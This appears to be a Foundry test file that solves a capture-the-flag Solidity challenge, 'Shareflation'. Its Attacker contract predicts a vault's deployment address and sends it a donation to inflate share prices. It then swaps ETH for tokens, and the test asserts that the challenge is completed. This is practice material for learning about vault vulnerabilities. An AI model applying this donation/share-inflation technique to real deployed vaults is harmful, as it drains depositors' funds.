// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console, Test} from "forge-std/Test.sol";
import {Shareflation, ShareToken, ShareVault} from "../src/Shareflation.sol";

address constant OWNER = address(0xB055);
address constant BOB = address(0xB0B);

interface ITarget {
    function isCompleted() external view returns (bool);
}

contract Attacker {
    function attack(address target) external {
        // Write your exploit here
        uint256 vaultNonce;
        Shareflation shareflation = Shareflation(target);
        bytes32 salt = keccak256(abi.encodePacked(address(this), vaultNonce));
        uint256 deposit = 1 ether;
        address computedAddress = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            target,
                            uint8(2)
                            // bytes1(0xff),
                            // target,
                            // salt,
                            // abi.encodePacked(type(ShareVault).creationCode, abi.encode(OWNER))
                        )
                    )
                )
            )
        );

        // Donate to vault address before it is created
        // (bool success,) = computedAddress.call{value: 1}("");
        // require(success, "Donation Attack Failed");
        console.log("Computed Address: ", computedAddress);
        address a = 0x43467e076ab86db973CfF4655906Bb3BD18323B6;
        (bool success,) = a.call{value: 1e9}("");
        require(success, "Donation Attack Failed");
        shareflation.swapEthSharesForToken{value: deposit}();
    }
}

contract ShareflationTest is Test {
    Shareflation private shareflation;
    ShareToken private shareToken;
    Attacker private attacker;

    function setUp() public {
        vm.prank(OWNER);
        shareflation = new Shareflation();
        attacker = new Attacker();
        console.log("Address of Shareflation: ", address(shareflation));

        shareToken = shareflation.token();
        vm.deal(address(this), 100 ether);
        vm.deal(BOB, 100 ether);
        vm.deal(address(attacker), 100 ether);
    }

    function testSwapEthSharesForToken() public {
        attacker.attack(address(shareflation));

        // assertEq(shareflation.totalETH(), deposit, "total ETH tracked");
        // assertEq(shareflation.ownerShares(), 1e18, "owner shares updated");
        assertEq(shareToken.balanceOf(address(attacker)), 2_000_000, "tokens minted");

        console.log(shareToken.totalSupply() * 1e6);
        console.log(shareflation.ownerShares() * shareflation.TOKEN_PER_ETH());

        assertTrue(shareflation.isCompleted());

        // try shareflation.ctf() {}
        // catch {
        //     assertTrue(false);
        // }
    }
}
